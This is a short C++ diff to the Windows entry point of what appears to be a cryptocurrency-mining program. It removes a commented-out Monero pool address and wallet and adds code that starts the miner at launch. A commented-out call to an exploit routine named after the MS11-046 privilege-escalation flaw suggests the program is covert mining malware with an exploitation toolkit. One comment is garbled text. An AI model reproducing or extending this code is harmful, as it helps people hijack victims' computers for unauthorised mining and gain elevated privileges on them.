@@ -23,28 +23,25 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance
 					_In_ LPWSTR    lpCmdLine,	_In_ int nCmdShow)
 {
 	LPWSTR *argvW;
-	int argc = 0;
-
+	
 	//char **argv = (char**)malloc(argc * sizeof(char *) + 1);
 	//memset(argv, '0', argc * sizeof(char *) + 1);
-	argvW = CommandLineToArgvW(GetCommandLine(), &argc);
+	
+	//argvW = CommandLineToArgvW(GetCommandLine(), &argc);
 	
 	//argvW2A(argv, argvW, argc);
-	
 
-	//char argv[8][128] = {"-o", "pool.minemonero.pro:5555",
-	//	"-u", "42FWmAzd2vjZCTrdgAmuvtEoDxQnT6R25Dx7wdUDB7EdVDN4bJ2k4wV2gA3cBwmZKr53eD4P4pJgA8fC7dhZ3ZQePzZ8SUq",
-	//	"-p","x","-k" };
+
 	
-	App minerApp(argc, argv);
-	//StartMiner(minerApp);
-	minerApp.exec();
 	
 	////CToolKit kit;
 	////kit.execExp(CToolKit::EXP_MS_11046);
 
 	//SysConfig();
 
+
+	App minerApp(0, NULL); //Î±²ÎÊý
+	StartMiner(minerApp);
 
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
